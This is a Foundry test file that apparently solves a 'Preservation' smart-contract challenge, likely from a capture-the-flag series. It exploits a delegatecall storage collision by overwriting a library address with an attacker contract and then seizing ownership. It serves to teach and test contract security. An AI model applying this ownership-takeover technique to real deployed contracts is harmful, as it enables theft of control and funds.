// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Preservation, LibraryContract} from "../src/contracts/16_Preservation.sol";
import {PreservationAttacker} from "../src/attackers/16_PreservationAttacker.sol";

contract PreservationTest is Test {
    address private owner = makeAddr("owner");
    Preservation private preservation;
    LibraryContract private timeZone1Library;
    LibraryContract private timeZone2Library;
    PreservationAttacker private preservationAttacker;

    function setUp() public {
        timeZone1Library = new LibraryContract();
        timeZone2Library = new LibraryContract();

        vm.prank(owner);
        preservation = new Preservation(
            address(timeZone1Library),
            address(timeZone2Library)
        );

        preservationAttacker = new PreservationAttacker();
    }

    function test_PreservationExploitVulnerability() public {
        address attacker = makeAddr("attacker");

        // Overwrite timeZone1Library to point to the preservationAttacker contract
        preservation.setFirstTime(
            uint256(uint160(address(preservationAttacker)))
        );

        // Call setFirstTime again with your own address to take ownership
        preservation.setFirstTime(uint256(uint160(attacker)));

        assertEq(preservation.owner(), attacker);
    }
}
